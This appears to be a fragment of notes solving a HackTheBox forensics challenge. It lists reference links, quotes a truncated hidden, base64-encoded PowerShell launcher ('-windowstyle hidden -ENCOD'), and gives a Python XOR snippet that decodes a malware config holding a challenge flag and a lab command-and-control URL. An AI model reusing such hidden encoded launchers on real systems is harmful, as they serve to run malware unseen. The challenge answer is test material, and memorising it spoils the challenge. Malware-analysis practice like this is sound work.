#https://blog.csdn.net/qq_46241655/article/details/123740113
#https://blog.csdn.net/qq_46241655/article/details/123751954

#https://domdom.tistory.com/168

'''
a virus inspection tool. ( see https://www.virustotal.com/ )
"pwsh.exe" -windowstyle hidden -ENCOD IABTAFYAIAAgADAAegBYACAAKABb...
...
with open('flag_xor.bin', 'rb') as f:
	buf = f.read()

print xor(buf, 0xdf)

#id:M8nHJyeR;int:3000;jit:500;flag:HTB{4n0th3R_d4Y_AnoThEr_pH1Sh};url:http://da-industrial.htb/js/9idlp/;
